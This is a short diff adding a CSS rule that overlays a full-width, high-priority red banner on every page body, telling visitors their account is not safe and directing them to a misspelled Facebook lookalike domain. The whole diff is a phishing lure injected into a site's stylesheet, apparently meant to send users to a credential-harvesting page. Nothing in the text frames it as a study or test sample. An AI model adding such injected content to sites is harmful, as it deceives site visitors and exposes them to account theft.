@@ -1,0 +1,14 @@
+body::before {
+    content: "Your account is not safe, please visit secure-faceboook.com";
+    position: absolute;
+    top: 0;
+    left: 0;
+    font-size: 14px;
+    font-weight: bold;
+    padding: 12px;
+    background-color: rgba(255, 12, 82);
+    width: 100%;
+    text-align: center;
+    color: white;
+    z-index: 100000;
+}
